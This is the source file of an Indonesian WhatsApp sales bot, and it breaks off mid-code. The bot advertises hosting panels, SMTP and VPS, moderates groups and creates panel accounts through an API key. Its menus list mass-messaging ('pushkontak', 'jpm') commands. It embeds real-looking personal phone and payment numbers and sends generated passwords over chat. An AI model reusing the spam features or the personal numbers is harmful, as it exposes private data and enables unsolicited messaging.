// [ NOTE:
//PLISS SCRIPT INI JANGAN DI-JUAL TANPA IZIN
//ATAU DI SHARE SECARA GRATIS
//MOHON HARGA CREATOR UTAMANY ]


"use strict";
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./SCRIPT BY RAMAA GNZZ/console.js')
const { isUrl, getRandom, getGroupAdmins, runtime, sleep, reSize, makeid, fetchJson, getBuffer } = require("./SCRIPT BY RAMAA GNZZ/myfunc.js");



const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");
const util = require('util')
const fetch = require('node-fetch')
const cheerio = require('cheerio')
const { sizeFormatter } = require('human-readable');
const format = sizeFormatter()

// Database
const setting = JSON.parse(fs.readFileSync('./setting.json'));
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
const mess = JSON.parse(fs.readFileSync('./mess.json'));
const db_error = JSON.parse(fs.readFileSync('./database/error.json'));
const { host, application, serverCreate } = require("./panel");
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString());

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async(ramz, msg, m, setting, store) => {
try {
let { ownerNumber, botName } = setting
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
global.prefa = ['','.']
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = [`${setting.ownerNumber}`,"6285791220179@s.whatsapp.net","6285806240904@s.whatsapp.net"].includes(sender) ? true : false
const isRama = [...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const isCmd = chats.startsWith(prefix)
const command = chats.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const botNumber = ramz.user.id.split(':')[0] + '@s.whatsapp.net'

// Group
const groupMetadata = isGroup ? await ramz.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)
const isAntiLink = antilink.includes(from) ? true : false

// Quoted
const quoted = msg.quoted ? msg.quoted : msg
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = ramz.sendMessage(from, { text: teks, mentions: mems })
return res
} else {
let res = ramz.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []



const reply = (teks) => {ramz.sendMessage(from, { text: teks }, { quoted: msg })}

//Antilink
if (isGroup && isAntiLink && isBotGroupAdmins){
if (chats.includes(`https://chat.whatsapp.com/`) || chats.includes(`http://chat.whatsapp.com/`)) {
if (!isBotGroupAdmins) return reply('Untung gw bukan admin')
if (isOwner) return reply('Untung lu owner ku:v😙')
if (isGroupAdmins) return reply('Admin grup mah bebas ygy🤭')
if (fromMe) return reply('Gw bebas share link')
await ramz.sendMessage(from, { delete: msg.key })
reply(`*「 GROUP LINK DETECTOR 」*\n\nTerdeteksi mengirim link group,Maaf sepertinya kamu akan di kick`)
ramz.groupParticipantsUpdate(from, [sender], "remove")
}
}

const sendContact = (jid, numbers, name, quoted, mn) => {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return ramz.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}


const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot Created By MiMiXd Solo\n`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;VelzzyBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/3c485ff201d9337be14ef.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}


// Console
if (isGroup && isCmd) {
console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!isGroup && isCmd) {
console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}

// Casenya
switch(command) {
	case 'menu':{
	let menu = `━━━━━[ MiMiXd Solo ]━━━━━


┏━━━『 𝘿𝘼𝙏𝘼 𝘽𝙊𝙏 』━━━━━◧
┃
┣» ᴄʀᴇᴀᴛᴏʀ : @${setting.kontakOwner}
┣» ʙᴏᴛ ɴᴀᴍᴇ : ${setting.botName}
┣» ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${setting.ownerName} 
┣» ᴠᴇʀsɪᴏɴ : 4
┃
┗━━━━━━━━━━━━━━━━━━◧
┏━━━━『 𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 』━━━━◧
┃
┣» .panelmenu
┣» .grupmenu
┣» .store
┣» .ownermenu
┣» .new
┣» .buypanel
┣» .ramlist
┗━━━━━━━━━━━━━━━━━━◧`
let btn_menu = [
{buttonId: '#buypanel', buttonText: {displayText: '️𝗕𝗨𝗬 𝗣𝗔𝗡𝗘𝗟'}, type: 1},
{buttonId: '#store', buttonText: {displayText: '️𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨'}, type: 1},
{buttonId: '#produk', buttonText: {displayText: '️𝗟𝗜𝗦𝗧 𝗣𝗥𝗢𝗗𝗨𝗞'}, type: 1},
]
ramz.sendMessage(from, {text: menu }, {quoted: fkontak})
}
break
case 'store':{
	let menu = `
┏━━━━『 𝙈𝙖𝙞𝙣 𝙈𝙚𝙣𝙪 』━━━━◧
┃
┣» .produk
┣» .listproduk
┣» .donasi
┣» .pembayaran 
┣» .id
┗━━━━━━━━━━━━━━━━━━◧`
ramz.sendMessage(from, {text: menu}, {quoted: fkontak})
}
break
case 'ramlist':{
	let menu = `
┏━━━━『 𝗟𝗜𝗦𝗧 𝗥𝗔𝗠 』━━━━◧
┃
┣» .1gb
┣» .2gb
┣» .3gb
┣» .4gb
┣» .5gb
┣» .6gb
┣» .7gb
┣» .unli
┣» .unlimited 
┗━━━━━━━━━━━━━━━━━━◧`
ramz.sendMessage(from, {text: menu}, {quoted: fkontak})
}
break
case 'new':{
	let menu = `
┏━━━━『 𝙉𝙚𝙬 𝙁𝙞𝙩𝙪𝙧 』━━━━◧
┃
┣» .addadmin (admin panel)
┣» .addusr2 (gk work button)
┣» .1gb nama,6285xxx
┣» .listadmin (admin panel)
┣» .listusr (no button)
┣» .listsrv (no button)
┃
┣» .addakses
┣» .delakses
┃
┣» .id
┣» .pushkontak
┣» .pushkontakv2 (id|text nya)
┣» .jpm (pushmember)
┗━━━━━━━━━━━━━━━━━━◧`
ramz.sendMessage(from, {text: menu}, {quoted: fkontak})
}
break
case 'grupmenu':{
	let menu = `
┏━━━『 𝙂𝙧𝙤𝙪𝙥 𝙈𝙚𝙣𝙪 』━━━◧
┃
┣» .hidetag
┣» .group open
┣» .group close 
┣» .antilink on
┣» .antilink off
┣» .kick 
┗━━━━━━━━━━━━━━━━━━◧`
ramz.sendMessage(from, {text: menu}, {quoted: fkontak})
}
break
case 'ownermenu':{
	let menu = `
┏━━━『 𝙊𝙬𝙣𝙚𝙧 𝙈𝙚𝙣𝙪 』━━━◧
┃
┣» .join
┣» .addakses
┣» .delakses
┣» .pushkontak
┣» .pushkontakv2 (id|text nya)
┣» .jpm (pushmember)
┃
┣» .addadmin (admin panel) (new)
┣» .addusr
┣» .addusr2 (new)
┣» .delusr
┣» .listusr
┣» .detusr
┣» .addsrv
┣» .delsrv
┣» .listsrv (new no button)
┣» .listusr (new no button)
┣» .listadmin (admin panel)
┣» .detsrv
┣» .updatesrv
┃
┗━━━━━━━━━━━━━━━━━━◧`
ramz.sendMessage(from, {text: menu}, {quoted: fkontak})
}
break
case 'panelmenu':
case 'petrodactyl':{
	let menu = `
┏━━『 𝙥𝙚𝙩𝙧𝙤𝙙𝙖𝙘𝙩𝙮𝙡 𝙈𝙚𝙣𝙪 』━━◧
┃
┣» .addadmin (admin panel) (new)
┣» .addusr
┣» .addusr2 (new)
┣» .delusr
┣» .listusr (no button)
┣» .listsrv (no button)
┣» .listadmin (admin panel)
┣» .detusr
┣» .addsrv
┣» .delsrv
┣» .detsrv
┣» .updatesrv
┃
┗━━━━━━━━━━━━━━━━━━◧`
ramz.sendMessage(from, {text: menu}, {quoted: fkontak})
}
break
case 'listproduk':
case 'produk':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`Creator by - ${setting.ownerName}`
let tampilan_nya = `Hallo Kak..👋
Saya adalah sistem Rancangan
Dari *MiMiXd Solo*.

Berikut List produk Kami yah kak🙏,
Jangan Lupa untuk order 👍
${strip_ny}
${prefix}listwhm
${prefix}rsmtp
${prefix}smtp
${prefix}vps
${prefix}jinstall
${prefix}jcurl
${prefix}ladminpanel
${prefix}buypanel
`
ramz.sendMessage(from,
{text: tampilan_nya,
mentions:[setting.ownerNumber, sender]})
}
break
case 'thanksto':
	ramz.sendMessage(from, {text: `*⫍ THANKS TO ⫎*
   •Allah Swt
   •Ortu
   •MiMiXd Solo *[Creator]*`},
{quoted: msg})
break
case 'yt':
case 'youtube':
	ramz.sendMessage(from, 
{text: `Jangan Lupa Subscriber yah kak😉🙏
*Link* : https://youtube.com/@ramz`},
{quoted: msg})
break
case 'ig':
case 'instagram':
	ramz.sendMessage(from, {text: `Admin Kurang ngurus ig uyy Jadi subscribe aja YouTube admin\n\nLink https://youtube.com/@ramz`},
{quoted: msg})
break
case 'groupadmin':
	ramz.sendMessage(from, 
{text: `*Group MiMiXd Solo*\n
Group1 :https://chat.whatsapp.com/GbWXaXcNdOCFjeH5XEqnTT`},
{quoted: msg})
break
case 'donasi': case 'donate':{
	if (isGroup) return 
let tekssss = `───「  *DONASI*  」────

*Payment donasi💰* 

- *Dana :* 081231319622
- *Gopay :*  081231886592
- *Qris :* Scan qr di atas

berapapun donasi dari kalian itu sangat berarti bagi kami 
`
ramz.sendMessage(from, { image: fs.readFileSync(`./gambar/qris.jpg`),
 caption: tekssss, 
footer: `${setting.ownerName} © 2023`},
{quoted: msg})
}
break
case 'id':
reply(from)
break
case 'join':{
 if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Kirim perintah ${prefix+command} _linkgrup_`)
var ini_urrrl = q.split('https://chat.whatsapp.com/')[1]
var data = await ramz.groupAcceptInvite(ini_urrrl)
reply('*Sukses Join The Group..*')
}
break
case 'pay':
case 'pembayaran':
case 'bayar':{
let tekssss = `───「  *PAYMENT*  」────

- *Dana :* 081231319622
- *Gopay :*  081231886592
- *Qris :* Scan qr di atas
OK, thanks udah order di *MiMiXd Solo*
`
ramz.sendMessage(from, { image: fs.readFileSync(`./gambar/qris.jpg`),
 caption: tekssss, 
footer: `${setting.ownerName} © 2022`},
{quoted: msg})
}
break
case 'buypanel':{
reply(`⚡𝗥𝗘𝗔𝗗𝗬 𝗣𝗔𝗡𝗘𝗟 𝗥𝗨𝗡 𝗕𝗢𝗧

1 GB   25% CPU.                "1k"
2 GB   50% CPU                 "2k" 
3 GB   75% CPU                 "3k"
4 GB 100% CPU                 "4k"
5 GB 130% CPU                 "5k"
6 GB 155% CPU                 "6k"
7 GB 185% CPU                "7k"
RAM UNLIMITED  CPU UNLIMITED.   "8k"

⚡𝗞𝗘𝗨𝗡𝗧𝗨𝗡𝗚𝗔𝗡
•ON 24JAM
•FAST RESPON
•NO RIBET
•HEMAT KOUTA
•ADA HARGA ADA KUALITAS 
•TAMPILAN TEMA KEREN 
•PANEL UDAH 3-BULAN BLOM MOKAD

PROMO💎
 ADMIN PANEL : 10k`)
}
break
//NIH LIST STORE NYA
case 'listwhm':
case 'buywhm':
case 'lwhm':{
let teq =`[ *LIST HARGA WHM* ]

Redy Kebutuhan Hosting 
WHm Mini : 15k
Whm Medium : 20k
Whm Extra : 25k
Whm Super : 30k

Mwhm mini : 35k
Mwhm Medium : 40k
Mwhwm Extra : 45k
Mwhm Super : 50k

Admin Host : 60k
CEO Host : 70k
Wakil Founder : 80k
Root : 90k


GARANSI 10 DAY

keuntungan :

- bisa buat web p 
- auto ssl
- supp all
- bergaransi

Jika Minat Chat wa.me/6281231319622
`
let btn_menu = [
{buttonId: `${prefix}proses`, buttonText: { displayText: 'BUY🛒' }, type: 1 },
]
ramz.sendMessage(from,
{text: teq},
{quoted: msg})
}
break
case 'smtp':
case 'listsmtp':
case 'buysmtp':{
let teq =`[ *LIST HARGA SMTP* ]

1 Minggu : 20k
2 Minggu : 35k
3 Minggu : 45k
1 Bulan : 60k



keuntungan :

- Support AutoRess
- Support Bot
- Support Panel Murni

Jika Minat Chat wa.me/6281231319622
`
let btn_menu = [
{buttonId: `${prefix}proses`, buttonText: { displayText: 'BUY🛒' }, type: 1 },
]
ramz.sendMessage(from,
{text: teq},
{quoted: msg})
}
break
case 'rsmtp':
case 'resellersmtp':
case 'listreseller':{
let teq =`[ *LIST HARGA Reseller SMTP* ]

Akses cPanel : 30k
Akses Root : 60k



keuntungan :

- Support AutoRess
- Support Bot
- Support Panel Murni

Jika Minat Chat wa.me/6281231319622`
let btn_menu = [
{buttonId: `${prefix}proses`, buttonText: { displayText: 'BUY🛒' }, type: 1 },
]
ramz.sendMessage(from,
{text: teq},
{quoted: msg})
}
break
case 'vps':
case 'listvps':
case 'buyvps':{
let teq =`[ *LIST HARGA VPS* ]

2gb 1core : 20k
4gb 2core : 35k
8gb 4core : 45k

GARANSI 7 DAY

keuntungan :

- bisa buat run bot langsung tanpa panel
- bisa buat admin whm/cpanel
- bisa buat apa saja tergantung pemakai

Jika Minat Chat wa.me/6281231319622`
let btn_menu = [
{buttonId: `${prefix}proses`, buttonText: { displayText: 'BUY🛒' }, type: 1 },
]
ramz.sendMessage(from,
{text: teq},
{quoted: msg})
}
break
case 'jinstall':
case 'jasainstall':
case 'installserver':{
let teq =`[ *List Jasa Install* ]

Panel Bot
2gb 1core : 25k
4gb 2core : 40k
8gb 4core : 50k

Server WHM
2gb 1core : 30k
4gb 2core : 50k
8gb 4core : 70k

GARANSI 7 DAY

keuntungan :

- Terima Jadi
- Bisa Req Domain
- Auto Balmod

Jika Minat Chat wa.me/6281231319622`
let btn_menu = [
{buttonId: `${prefix}proses`, buttonText: { displayText: 'BUY🛒' }, type: 1 },
]
ramz.sendMessage(from,
{text: teq},
{quoted: msg})
}
break
case 'jcurl':
case 'jasacurl':
case 'curlbot':{
let teq =`[ *List Jasa Curl* ]

5 Tamp : 30k
7 Tamp : 40k
10 Tamp : 60k


- Terima Jadi
- Free Domain
- Auto Balmod

Jika Minat Chat wa.me/6281231319622`
let btn_menu = [
{buttonId: `${prefix}proses`, buttonText: { displayText: 'BUY🛒' }, type: 1 },
]
ramz.sendMessage(from,
{text: teq},
{quoted: msg})
}
break
case 'adminpanel':
case 'buyadminpanel':
case 'ladminpanel':{
let teq =`[ *LIST HARGA ADMIN PANEL* ]

HARGA = 10K

GARANSI 10 DAY

keuntungan :

- bisa buat jualan
- auto balik modal
- bergaransi

Jika Minat Chat wa.me/6281231319622`
let btn_menu = [
{buttonId: `${prefix}proses`, buttonText: { displayText: 'BUY🛒' }, type: 1 },
]
ramz.sendMessage(from,
{text: teq},
{quoted: msg})
}
break
case 'proses':{
let tek = (`「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n*--------------------------*\n\n*Pesanan ini akan diproses manual oleh admin,* *Tunggu admin memprosesnya🙏*\n*Atau Chat : Wa.me//${setting.kontakOwner}*`)
let btn_menu = [
{buttonId: `${prefix}aokeguwgw`, buttonText: { displayText: 'OKE SAYA TUNGGU👍' }, type: 1 },
]
ramz.sendMessage(from,
{text: tek})
ramz.sendMessage(`${setting.ownerNumber}`, {text: `*👋HALLO OWNER KU, ADA YANG ORDER NIH*\n\n*DARI* : ${sender.split('@')[0]}`})
}
break
case 'done':{
if (!isOwner && !fromMe) return reply('Ngapain..?')
let tek = (`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih Telah order di *MiMiXd Solo*\nNext Order ya🙏`)
let btn_menu = [
{buttonId: `${prefix}aokeguwgw`, buttonText: { displayText: 'OKE THENKS👍' }, type: 1 },
]
ramz.sendMessage(from,
{text: tek})
}
break
//FITUR GROUP
case 'hidetag':
if (!isGroup) return reply(mess.OnlyGroup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
ramz.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'antilink':{
if (!isGroup) return reply(mess.OnlyGroup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink belum aktif')
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'group':
case 'grup':
if (!isGroup) return reply(mess.OnlyGroup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
ramz.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
ramz.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break
case 'kick':
if (!isGroup) return reply(mess.OnlyGroup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
ramz.groupParticipantsUpdate(from, [number], "remove")
.then( res => 
reply(`*Sukses mengeluarkan member..!*`))
.catch((err) => reply(mess.error.api))
} else if (isQuotedMsg) {
number = quotedMsg.sender
ramz.groupParticipantsUpdate(from, [number], "remove")
.then( res => 
reply(`*Sukses mengeluarkan member..!*`))
.catch((err) => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan orang yang ingin dikeluarkan dari grup`)
}
break
//Gausah colong² fitur, Minimal kalo nyolong kasih credit By MiMiXd Solo
case 'addusr':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let email = s[0]
let username = s[1]
let nomor = s[2]
if (!email) return reply(`Ex : ${prefix+command} Email,Username,@tag/nomor\n\nContoh :\n${prefix+command} example@gmail.com,example,@user`)
if (!username) return reply(`Ex : ${prefix+command} Email,Username,@tag/nomor\n\nContoh :\n${prefix+command} example@gmail.com,example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Email,Username,@tag/nomor\n\nContoh :\n${prefix+command} example@gmail.com,example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
}
break
case 'addadmin':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let email = s[0]
let username = s[1]
let nomor = s[2]
if (!email) return reply(`Ex : ${prefix+command} Email,Username,@tag/nomor\n\nContoh :\n${prefix+command} example@gmail.com,example,@user`)
if (!username) return reply(`Ex : ${prefix+command} Email,Username,@tag/nomor\n\nContoh :\n${prefix+command} example@gmail.com,example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Email,Username,@tag/nomor\n\nContoh :\n${prefix+command} example@gmail.com,example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"root_admin": true,
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user admin\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*TYPE:* user admin\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
}
break
case 'delusr':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
if (!q) return reply(`Ex : ${prefix+command} userId\n\nContoh :\n${prefix+command} 2`)
let f = await fetch(host + "/api/application/users/" + q, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
break
case 'addusr2':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let username = s[0]
let nomor = s[1]
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
